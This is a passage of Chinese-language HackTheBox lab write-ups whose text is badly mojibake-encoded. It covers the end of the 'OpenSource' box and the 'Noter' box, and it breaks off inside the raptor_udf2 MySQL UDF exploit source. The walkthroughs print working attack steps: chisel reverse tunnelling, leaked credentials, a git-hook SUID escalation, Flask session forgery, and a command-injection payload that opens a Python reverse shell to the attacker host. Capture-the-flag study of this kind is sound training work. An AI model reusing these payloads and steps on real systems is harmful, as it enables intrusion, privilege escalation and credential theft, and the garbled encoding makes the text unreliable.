May 4 16:35 usr drwxr-xr-x 1 root root 4096 May 4 16:35 var ç¡®å®æ˜¯åœ¨ docker é‡Œ è™šæ‹Ÿæœºé€ƒé€¸ https://github.com/jpillora/chisel è¿™è¾¹ä½¿ç”¨ chisel æ¥è¿›è¡Œé€ƒé€¸ï¼Œæˆ‘ä»¬å…ˆæƒ³åŠæ³•ç»™å¼„åˆ°é¶æœºé‡Œ /dev/shm # wget http://10.10.14.33:8000/chisel Connecting to 10.10.14.33:8000 (10.10.14.33:8000) saving to &#39;chisel&#39; chisel 2% | | 178k 0:00:43 ETA chisel 26% |******** | 2075k 0:00:05 ETA chisel 39% |************ | 3110k 0:00:04 ETA chisel 53% |***************** | 4202k 0:00:03 ETA chisel 69% |********************** | 5495k 0:00:02 ETA chisel 81% |************************** | 6462k 0:00:01 ETA chisel 92% |***************************** | 7327k 0:00:00 ETA chisel 100% |********************************| 7888k 0:00:00 ETA &#39;chisel&#39; saved /dev/shm # ls chisel /dev/shm # ./chisel /bin/sh: ./chisel: Permission denied /dev/shm # ls -la total 7888 drwxrwxrwt 2 root root 60 Jun 6 13:47 . drwxr-xr-x 5 root root 340 Jun 6 08:06 .. -rw-r--r-- 1 root root 8077312 Jun 6 13:46 chisel /dev/shm # chmod 777 chisel /dev/shm # ./chisel /bin/sh: ./chisel: Permission denied å¯ä»¥çœ‹åˆ°ï¼Œåœ¨ &#x2F;dev&#x2F;shm æ˜¯æ²¡æœ‰æ‰§è¡Œæƒé™çš„ï¼Œå³ä½¿ç»™äº†æƒé™ä¹Ÿæ— æ³•æ‰§è¡Œ /dev/shm # mv chisel /app /dev/shm # cd /app /app # ls INSTALL.md app chisel public run.py /app # ./chisel Usage: chisel [command] [--help] Version: 1.7.7 (go1.17.6) Commands: server - runs chisel in server mode client - runs chisel in client mode Read more: https://github.com/jpillora/chisel å˜é€šä¸€ä¸‹ï¼Œæ¢ä¸ªä½ç½®å°±å¯ä»¥æ‰§è¡Œäº† è¿™è¾¹ç»™å‡ºæç¤ºäº†ï¼Œæˆ‘ä»¬å»å¼€å¯ä¸€ä¸ª socks5 é€šé“å§ æœ¬åœ° ./chisel server --reverse --port 6969 é¶æœº ./chisel client 10.10.14.33:6969 R:172.17.0.1:3000 æœ¬æœº â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ./chisel server --reverse --port 6969 2022/06/06 22:03:03 server: Reverse tunnelling enabled 2022/06/06 22:03:03 server: Fingerprint eok9TFfTK+YpN31Xcx/GZgBfBuElFqfn/SWgZD8lLLU= 2022/06/06 22:03:03 server: Listening on http://0.0.0.0:6969 2022/06/06 22:11:28 server: session#1: tun: proxy#R:3000=&gt;172.17.0.1:3000: Listening é¶æœº /app # ./chisel client 10.10.16.2:6969 R:172.17.0.1:3000 2022/06/07 02:11:23 client: Connecting to ws://10.10.16.2:6969 2022/06/07 02:11:27 client: Connected (Latency 276.641246ms) ç„¶åè®¿é—® 127.0.0.1:3000 æˆåŠŸè®¿é—® æ³¨å†Œä¸€ä¸ªè´¦æˆ·ç™»å…¥åï¼Œåœ¨æ¢ç´¢çš„ç”¨æˆ·é‡Œå‘ç°æœ‰ä¸€ä¸ªåä¸º dev01 çš„ç”¨æˆ· git show-branch git log dev --oneline git show a76f8f7 ä½¿ç”¨ä»¥ä¸Šä¸‰æ¡å‘½ä»¤è·å–æˆ‘ä»¬è¦çš„è´¦æˆ·å¯†ç  â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/source] â””â”€# git show-branch 1 âš™ ! [dev] ease testing * [public] clean up dockerfile for production use -- * [public] clean up dockerfile for production use + [dev] ease testing + [dev^] added gitignore + [dev~2] updated +* [public^] initial â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/source] â””â”€# git log dev --oneline 1 âš™ c41fede (dev) ease testing be4da71 added gitignore a76f8f7 updated ee9d9f1 initial â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/source] â””â”€# git show a76f8f7 1 âš™ commit a76f8f75f7a4a12b706b0cf9c983796fa1985820 Author: gituser &lt;gituser@local&gt; Date: Thu Apr 28 13:46:16 2022 +0200 updated diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json new file mode 100644 index 0000000..5975e3f --- /dev/null +++ b/app/.vscode/settings.json @@ -0,0 +1,5 @@ +{ + &quot;python.pythonPath&quot;: &quot;/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python&quot;, + &quot;http.proxy&quot;: &quot;http://dev01:Soulless_Developer#2022@10.10.10.128:5187/&quot;, + &quot;http.proxyStrictSSL&quot;: false +} diff --git a/app/app/views.py b/app/app/views.py index f2744c6..0f3cc37 100644 --- a/app/app/views.py +++ b/app/app/views.py @@ -6,7 +6,17 @@ from flask import render_template, request, send_file from app import app -@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;]) +@app.route(&#39;/&#39;) +def index(): + return render_template(&#39;index.html&#39;) + + +@app.route(&#39;/download&#39;) +def download(): + return send_file(os.path.join(os.getcwd(), &quot;app&quot;, &quot;static&quot;, &quot;source.zip&quot;)) + + +@app.route(&#39;/upcloud&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;]) def upload_file(): if request.method == &#39;POST&#39;: f = request.files[&#39;file&#39;] @@ -20,4 +30,4 @@ def upload_file(): @app.route(&#39;/uploads/&lt;path:path&gt;&#39;) def send_report(path): path = get_file_name(path) - return send_file(os.path.join(os.getcwd(), &quot;public&quot;, &quot;uploads&quot;, path)) \\ No newline at end of file + return send_file(os.path.join(os.getcwd(), &quot;public&quot;, &quot;uploads&quot;, path)) å¾—åˆ°äº†è´¦å·å¯†ç  username = dev01 password = Soulless_Developer#2022 ç„¶åå»ç™»é™†ä¸€ä¸‹ Gitea ç™»é™†æˆåŠŸ è¿™è¾¹æœ‰ä¸€ä¸ª home-backup é¡¹ç›®ï¼Œå»çœ‹çœ‹ åœ¨é‡Œé¢å‘ç°äº†ä¸€ä¸ª .ssh æ–‡ä»¶å¤¹ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½æ‰¾åˆ° ssh-key Nice æ‰¾åˆ°äº† ssh-key ç›´æ¥å»å°è¯•è¿æ¥ ssh â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ssh dev01@10.10.11.164 -i id_rsa The authenticity of host &#39;10.10.11.164 (10.10.11.164)&#39; can&#39;t be established. ECDSA key fingerprint is SHA256:a6VljAI6pLD7/108ls+Bi5y88kWaYI6+V4lTU0KQsQU. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.11.164&#39; (ECDSA) to the list of known hosts. Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-176-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue Jun 7 03:07:46 UTC 2022 System load: 0.0 Processes: 241 Usage of /: 75.0% of 3.48GB Users logged in: 0 Memory usage: 22% IP address for eth0: 10.10.11.164 Swap usage: 0% IP address for docker0: 172.17.0.1 16 updates can be applied immediately. 9 of these updates are standard security updates. To see these additional updates run: apt list --upgradable Last login: Mon May 16 13:13:33 2022 from 10.10.14.23 dev01@opensource:~$ whoami&amp;&amp;id dev01 uid=1000(dev01) gid=1000(dev01) groups=1000(dev01) æˆåŠŸé€ƒé€¸å‡ºæ¥ dev01@opensource:~$ ls user.txt dev01@opensource:~$ cat user.txt 80fc1f5f07080181febb1098b2c7070c æˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶ æƒé™æå‡dev01@opensource:~$ ls -la total 44 drwxr-xr-x 7 dev01 dev01 4096 May 16 12:51 . drwxr-xr-x 4 root root 4096 May 16 12:51 .. lrwxrwxrwx 1 dev01 dev01 9 Mar 23 01:21 .bash_history -&gt; /dev/null -rw-r--r-- 1 dev01 dev01 220 Apr 4 2018 .bash_logout -rw-r--r-- 1 dev01 dev01 3771 Apr 4 2018 .bashrc drwx------ 2 dev01 dev01 4096 May 4 16:35 .cache drwxrwxr-x 8 dev01 dev01 4096 Jun 7 03:09 .git drwx------ 3 dev01 dev01 4096 May 4 16:35 .gnupg drwxrwxr-x 3 dev01 dev01 4096 May 4 16:35 .local -rw-r--r-- 1 dev01 dev01 807 Apr 4 2018 .profile drwxr-xr-x 2 dev01 dev01 4096 May 4 16:35 .ssh -rw-r----- 1 root dev01 33 Jun 7 01:50 user.txt dev01@opensource:~$ cd .git dev01@opensource:~/.git$ ls -la total 56 drwxrwxr-x 8 dev01 dev01 4096 Jun 7 03:09 . drwxr-xr-x 7 dev01 dev01 4096 May 16 12:51 .. drwxrwxr-x 2 dev01 dev01 4096 May 4 16:35 branches -rw-r--r-- 1 dev01 dev01 22 Jun 7 03:09 COMMIT_EDITMSG -rw-rw-r-- 1 dev01 dev01 269 Jun 7 03:08 config -rw-rw-r-- 1 dev01 dev01 73 Mar 23 01:18 description -rw-rw-r-- 1 dev01 dev01 117 Mar 23 01:19 FETCH_HEAD -rw-r--r-- 1 dev01 dev01 21 May 16 12:50 HEAD drwxrwxr-x 2 dev01 dev01 4096 May 4 16:35 hooks -rw-r--r-- 1 root root 845 Jun 7 01:51 index drwxrwxr-x 2 dev01 dev01 4096 May 4 16:35 info drwxr-xr-x 3 dev01 dev01 4096 May 4 16:35 logs drwxrwxr-x 44 dev01 dev01 4096 Jun 7 01:51 objects drwxrwxr-x 5 dev01 dev01 4096 May 4 16:35 refs è¿™è¾¹å¯ä»¥æ ¹æ®ä¹‹å‰çš„æ–‡ä»¶æ¥çŒœæµ‹ï¼Œå¯èƒ½å­˜åœ¨ .git&#x2F;hooks æ–‡ä»¶å¤¹ï¼ŒæŸ¥çœ‹äº†ä¸€ä¸‹ç¡®å®å­˜åœ¨ï¼Œæˆ‘ä»¬è¿›å»çœ‹çœ‹ dev01@opensource:~/.git/hooks$ cat pre-commit.sample #!/bin/sh # # An example hook script to verify what is about to be committed. # Called by &quot;git commit&quot; with no arguments. The hook should # exit with non-zero status after issuing an appropriate message if # it wants to stop the commit. # # To enable this hook, rename this file to &quot;pre-commit&quot;. if git rev-parse --verify HEAD &gt;/dev/null 2&gt;&amp;1 then against=HEAD else # Initial commit: diff against an empty tree object against=4b825dc642cb6eb9a060e54bf8d69288fbee4904 fi # If you want to allow non-ASCII filenames set this variable to true. allownonascii=$(git config --bool hooks.allownonascii) # Redirect output to stderr. exec 1&gt;&amp;2 # Cross platform projects tend to avoid non-ASCII filenames; prevent # them from being added to the repository. We exploit the fact that the # printable range starts at the space character and ends with tilde. if [ &quot;$allownonascii&quot; != &quot;true&quot; ] &amp;&amp; # Note that the use of brackets around a tr range is ok here, (it&#39;s # even required, for portability to Solaris 10&#39;s /usr/bin/tr), since # the square bracket bytes happen to fall in the designated range. test $(git diff --cached --name-only --diff-filter=A -z $against | LC_ALL=C tr -d &#39;[ -~]\\0&#39; | wc -c) != 0 then cat &lt;&lt;\\EOF Error: Attempt to add a non-ASCII file name. This can cause problems if you want to work with people on other platforms. To be portable it is advisable to rename the file. If you know what you are doing you can disable this check using: git config hooks.allownonascii true EOF exit 1 fi # If there are whitespace errors, print the offending file names and fail. exec git diff-index --check --cached $against -- pre-commit.sample æ–‡ä»¶çœ‹èµ·æ¥å¾ˆæœ‰å¸Œæœ›å•Šï¼Ÿè®©æˆ‘ä»¬ç¨ç¨çš„ä¿®æ”¹ä¸€ä¸‹ æˆ‘ä»¬å°† chmod u+s &#x2F;bin&#x2F;bash æ·»åŠ åˆ° pre-commit.sample çš„ #!&#x2F;bn&#x2F;bash ä¸€è¡Œä¸‹ æ¥ç€å°† pre-commit.sample æ–‡ä»¶åæ”¹ä¸º pre-commit dev01@opensource:~/.git/hooks$ /bin/bash -p bash-4.4# whoami&amp;&amp;id root uid=1000(dev01) gid=1000(dev01) euid=0(root) groups=1000(dev01) ç„¶åè¿›è¡Œåˆ©ç”¨ï¼ŒæˆåŠŸè¸¢æ‹³é“ root æƒé™ bash-4.4# cat /root/root.txt b6936fa688d43c9d1cc68e6c0fd1971e æˆåŠŸè·å¾— root æƒé™çš„ flag æ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Noter - Hackthebox","slug":"Hackthebox - Noter","date":"2022-05-22T11:38:36.000Z","updated":"2023-05-20T02:26:29.000Z","comments":true,"path":"2022/05/22/Hackthebox - Noter/","link":"","permalink":"http://www.lucifiel.com/2022/05/22/Hackthebox%20-%20Noter/","excerpt":"","text":"Hackthebox - Noteré¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æ”¶é›†Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.160 Starting Nmap 7.91 ( https://nmap.org ) at 2022-05-22 02:50 EDT Nmap scan report for 10.10.11.160 Host is up (0.12s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA) | 256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA) |_ 256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519) 5000/tcp open http Werkzeug httpd 2.0.2 (Python 3.8.10) |_http-title: Noter No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=5/22%OT=21%CT=1%CU=41426%PV=Y%DS=2%DC=T%G=Y%TM=6289DD5 OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1 OS:1NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN OS:(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 3389/tcp) HOP RTT ADDRESS 1 126.10 ms 10.10.14.1 2 126.30 ms 10.10.11.160 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 39.63 seconds Http æ­£å¦‚åå­—è®°å½•ï¼Œè¿™æ˜¯ä¸€å°ç¬”è®°ç›¸å…³çš„é¶æœº è¿™é‡Œç”¨ Wappalyzer å¯ä»¥çœ‹åˆ°æ˜¯ä¸€å° Flask ç›¸å…³çš„é¶æœº ç›´æ¥ç™»é™†æç¤ºçš„æ˜¯ Invalid credentials ï¼Œè¿™é‡Œä¹Ÿæœ‰æ³¨å†Œå£ï¼Œå…ˆå»æ³¨å†Œä¸ªè´¦å·çœ‹çœ‹ æ³¨å†Œä¸€ä¸ªè´¦å·åï¼Œä½¿ç”¨é”™è¯¯çš„å¯†ç ç™»é™†ï¼Œæç¤ºçš„æ˜¯ Invalid login ï¼Œé‚£å°±æ„å‘³ç€ç”¨æˆ·åå¯ä»¥è¢«çˆ†ç ´ï¼Œåœ¨æŠ“ç»§ç»­æŸ¥çœ‹çš„åŒæ—¶ï¼Œæˆ‘ä»¬å…ˆå»çˆ†ç ´ç”¨æˆ·åçœ‹çœ‹ ä½¿ç”¨ç”¨æˆ·åå­—å…¸ &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Usernames&#x2F;cirt-default-usernames.txtï¼Œç„¶åä½¿ç”¨ Burp æŠ“åŒ…è¿›è¡Œçˆ†ç ´ æœ€åå¾—åˆ°äº†ä¸€ä¸ªç”¨æˆ·å blue ç„¶åä½¿ç”¨æˆ‘ä»¬æ³¨å†Œçš„è´¦æˆ·è¿›è¡Œç™»é™† å€’æ˜¯æ²¡çœ‹åˆ°ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ cookie å¤„ å‘ç°äº†ä¸€ä¸ª JWT Tokenï¼Œæ‹¿å»è§£å¯† æ¼æ´åˆ©ç”¨ https://github.com/Paradoxis/Flask-Unsign æ—¢ç„¶ç¡®å®šæ˜¯ Flask å¹¶ä¸”æœ‰ JWT äº†ï¼Œé‚£å°±å…ˆæš´åŠ›ç ´è§£ JWT Token çš„å¯†é’¥å§ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/Flask-Unsign-master] â””â”€# flask-unsign --unsign --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval --cookie &#39;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoibHVjaWZpZWwifQ.YonkHw.yXozzyS_yg75iFARMutm6Be2D64&#39; [*] Session decodes to: {&#39;logged_in&#39;: True, &#39;username&#39;: &#39;lucifiel&#39;} [*] Starting brute-forcer with 8 threads.. [+] Found secret key after 17152 attempts b&#39;secret123&#39; æ¥ç€ä½¿ç”¨æˆ‘ä»¬å¾—åˆ°çš„å¯†é’¥ secret123 å’Œç”¨æˆ·å blue å»ç”Ÿæˆä¸€æ®µ JWT Token å§ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/Flask-Unsign-master] â””â”€# flask-unsign --sign --cookie &quot;{&#39;logged_in&#39;: True, &#39;username&#39;: &#39;blue&#39;}&quot; --secret &#39;secret123&#39; eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.Yonkfg.c45FeiSpfEgpBTGIvOACAJVXKbk æ¥ç€æ›¿æ¢æˆ‘ä»¬çš„ JWT Token åï¼Œåˆ·æ–°é¡µé¢ æˆ‘ä»¬æˆåŠŸè¿›å…¥äº† blue ç”¨æˆ·çš„åå° æˆ‘ä»¬æ³¨æ„åˆ°ï¼Œåœ¨è¿™ç¯‡æ–‡ç« é‡Œï¼Œftp_admin ç”¨æˆ·æœ‰ä¸€ä»½ç¬”è®°ï¼Œå¤§æ„æ˜¯è¯´æˆ‘ä»¬å¯ä»¥è®¿é—® FTPï¼Œå¹¶ä¸”ç»™äº†æˆ‘ä»¬ä¸€ä¸ªè´¦å·å¯†ç  username = blue password = blue@Noter! å»ç™»é™† â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ftp 10.10.11.160 Connected to 10.10.11.160. 220 (vsFTPd 3.0.3) Name (10.10.11.160:root): blue 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. æˆåŠŸç™»é™†äº† ftp&gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 1002 1002 4096 May 02 23:05 files -rw-r--r-- 1 1002 1002 12569 Dec 24 20:59 policy.pdf 226 Directory send OK. ftp&gt; get policy.pdf local: policy.pdf remote: policy.pdf 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for policy.pdf (12569 bytes). 226 Transfer complete. 12569 bytes received in 0.00 secs (54.9850 MB/s) è¿™é‡Œçœ‹åˆ°æœ‰ä¸€ä¸ªåä¸º policy.pdf çš„æ–‡ä»¶ï¼Œç»™ä¸‹è½½ä¸‹æ¥ åœ¨åˆ›å»ºå¯†ç çš„ç¬¬å››æ¡æåˆ°äº† Default user-password generated by the application is in the format of &quot;username@site_name!&quot; (This applies to all your applications) è¿™é‡Œçš„æ„æ€æ˜¯ï¼Œé»˜è®¤ç”¨æˆ·å¯†ç çš„æ ¼å¼æ˜¯ username@sie_name! æŒ‰ç…§æˆ‘ä»¬å½“å‰çš„æƒ…å†µï¼Œå¹¶ä¸”ç®¡ç†å‘˜æ˜¯ ftp_admin çš„æƒ…å†µä¸‹ï¼Œé‚£å°±å¾—åˆ°äº†ä¸€ä¸ªè´¦å·å¯†ç  username = ftp_admin password = ftp_admin@Noter! ç»§ç»­ç™»é™† ftp â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ftp 10.10.11.160 Connected to 10.10.11.160. 220 (vsFTPd 3.0.3) Name (10.10.11.160:root): ftp_admin 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ç™»é™†æˆåŠŸ ftp&gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 1003 1003 25559 Nov 01 2021 app_backup_1635803546.zip -rw-r--r-- 1 1003 1003 26298 Dec 01 05:52 app_backup_1638395546.zip 226 Directory send OK. ftp&gt; get app_backup_1635803546.zip local: app_backup_1635803546.zip remote: app_backup_1635803546.zip 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for app_backup_1635803546.zip (25559 bytes). 226 Transfer complete. 25559 bytes received in 0.13 secs (193.4986 kB/s) ftp&gt; get app_backup_1638395546.zip local: app_backup_1638395546.zip remote: app_backup_1638395546.zip 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for app_backup_1638395546.zip (26298 bytes). 226 Transfer complete. 26298 bytes received in 0.13 secs (193.9745 kB/s) è¿™é‡Œæœ‰ä¸¤ä¸ª zip æ–‡ä»¶ï¼Œæˆ‘ä»¬ä¸‹è½½è§£å‹åï¼Œå‘ç°é‡Œé¢çš„ç»“æ„æ˜¯ä¸€æ ·çš„ï¼Œè¿›è¡Œä¸€ä¸‹æ¯”è¾ƒ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# diff ./1/app.py ./2/app.py 17,18c17,18 &lt; app.config[&#39;MYSQL_USER&#39;] = &#39;root&#39; &lt; app.config[&#39;MYSQL_PASSWORD&#39;] = &#39;Nildogg36&#39; æˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ª mysql çš„è´¦å·å¯†ç  username = root password = Nildogg36 rand_int = random.randint(1,10000) command = f&quot;node misc/md-to-pdf.js $&#39;{note[&#39;body&#39;]}&#39; {rand_int}&quot; subprocess.run(command, shell=True, executable=&quot;/bin/bash&quot;) åœ¨ app_backup_1638395546.zip çš„ app.py çš„ç¬¬ 283 è¡Œï¼Œæˆ‘ä»¬çœ‹åˆ°äº†ä¸€ä¸ª RCE æ¼æ´ å¡«å…¥æˆ‘ä»¬çš„ Shell è¯­å¥ url = request.form[&#39;url&#39;] status, error = parse_url(url) if (status is True) and (error is None): try: r = pyrequest.get(url,allow_redirects=True) rand_int = random.randint(1,10000) command = f&quot;node misc/md-to-pdf.js $&#39;{r.text.strip()}&#39; {rand_int}&quot; subprocess.run(command, shell=True, executable=&quot;/bin/bash&quot;) é€šè¿‡è¿™éƒ¨åˆ†ä»£ç ï¼Œæˆ‘ä»¬æ„é€ äº†ä¸€æ®µ POC æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªåä¸º exploit.md çš„æ–‡ä»¶ &#39;;python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.6&quot;,4444)); os.dup2( s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#39; # &#39; æ¥ç€ä½¿ç”¨ NC ç›‘å¬ä¸€ä¸ªç«¯å£ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... ç„¶åä½¿ç”¨ python3 æ‰“å¼€ä¸€ä¸ª http æœåŠ¡ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... ç„¶åå»é¡µé¢ä¸Šè®¿é—®ä¸€ä¸‹ å¡«å…¥æˆ‘ä»¬çš„ shell åœ°å€ï¼Œç„¶åæ‰§è¡Œ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.6] from (UNKNOWN) [10.10.11.160] 53994 $ python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; svc@noter:~/app/web$ whoami&amp;&amp;id whoami&amp;&amp;id svc uid=1001(svc) gid=1001(svc) groups=1001(svc) æˆåŠŸæ‹¿åˆ°ä¸€ä¸ª user æƒé™ svc@noter:/home$ cat /home/svc/user.txt cat /home/svc/user.txt ed6e3a8ea6c35a17e3d63a425cb95c11 æˆåŠŸæ‹¿åˆ°ä¸€ä¸ª user æƒé™çš„ flag æ–‡ä»¶ æƒé™æå‡æˆ‘ä»¬ä¹‹å‰è·å¾—è¿‡ä¸€ä¸ª mysql çš„å‡­è¯ï¼Œè¿™åº”è¯¥æ˜¯ä¸€ä¸ªæç¤ºï¼Œå»çœ‹çœ‹è¿›ç¨‹ svc@noter:~/app/web$ mysql -V mysql -V mysql Ver 15.1 Distrib 10.3.32-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2 å’±ä»¬çŸ¥é“äº† mysql çš„ç‰ˆæœ¬ï¼Œç„¶åæœç´¢ä¸€ä¸‹ mysql udf â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# searchsploit mysql udf ------------------------------------------------------------------------------------------------------------ --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------------------------------------ --------------------------------- MySQL 4.0.17 (Linux) - User-Defined Function (UDF) Dynamic Library (1) | linux/local/1181.c MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2) | linux/local/1518.c MySQL 4/5/6 - UDF for Command Execution | linux/local/7856.txt ------------------------------------------------------------------------------------------------------------ --------------------------------- Shellcodes: No Results åº”è¯¥æ˜¯ç¬¬äºŒä¸ªäº† â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# locate linux/local/1518.c /usr/share/exploitdb/exploits/linux/local/1518.c æŠŠ exp ç»™ä¿å­˜åˆ°æ¡Œé¢ /* * $Id: raptor_udf2.c,v 1.1 2006/01/18 17:58:54 raptor Exp $ * * raptor_udf2.c - dynamic library for do_system() MySQL UDF * Copyright (c) 2006 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt; * * This is an helper dynamic library for local privilege escalation through * MySQL run with root privileges (very bad idea!), slightly modified to work * with newer versions of the open-source database. Tested on MySQL 4.1.14. * * See also: http://www.0xdeadbeef.info/exploits/raptor_udf.c * * Starting from MySQL 4.1.10a and MySQL 4.0.24, newer releases include fixes * for the security vulnerabilities in the handling of User Defined Functions * (UDFs) reported by Stefano Di Paola &lt;stefano.dipaola@wisec.it&gt;. For further * details, please refer to: * * http://dev.mysql.com/doc/refman/5.0/en/udf-security.html * http://www.wisec.it/vulns.php?page=4 * http://www.wisec.it/vulns.php?page=5 * http://www.wisec.it/vulns.php?page=6 * * &quot;UDFs should have at least one symbol defined in addition to the xxx symbol * that corresponds to the main xxx() function. These auxiliary symbols * correspond to the xxx_init(), xxx_deinit(), xxx_reset(), xxx_clear(), and * xxx_add() functions&quot;. -- User Defined Functions Security Precautions * * Usage: * $ id * uid=500(raptor) gid=500(raptor) groups=500(raptor) * $ gcc -g -c raptor_udf2.c * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc * $ mysql -u root -p * Enter password: * [...] * mysql&gt; use mysql; * mysql&gt; create table foo(line blob); * mysql&gt; insert into foo values(load_file(&#39;/home/raptor/raptor_udf2.so&#39;)); * mysql&gt; select * from foo into dumpfile &#39;/usr/lib/raptor_udf2.so&#39;; * mysql&gt; create function do_system returns integer soname &#39;raptor_udf2.so&#39;; * mysql&gt; select * from mysql.func; * +-----------+-----+----------------+----------+ * | name | ret | dl | type | * +-----------+-----+----------------+----------+ * | do_system | 2 | raptor_udf2.so | function | * +-----------+-----+----------------+----------+ * mysql&gt; select do_system(&#39;id &gt; /tmp/out; chown raptor.raptor /tmp/out&#39;); * mysql&gt; \\! sh * sh-2.05b$ cat /tmp/out * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm) * [...] * * E-DB Note: Keep an eye on https://github.com/mysqludf/lib_mysqludf_sys * */ #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT}; typedef struct st_udf_args { unsigned int arg_count; // number of arguments enum Item_result *arg_type; // pointer to item_result char **args; // pointer to arguments unsigned long *lengths; // length of string args char *maybe_null; // 1 for maybe_null args } UDF_ARGS; typedef struct st_udf_init { char maybe_null; // 1 if func can return NULL unsigned int decimals; // for real functions unsigned long max_length; // for string functions char *ptr; // free ptr for func data char const_item; // 0 if result is constant } UDF_INIT; int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error) { if (args-&gt;arg_count != 1) return(0); system(args-&gt;args[0]); return(0); } char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char 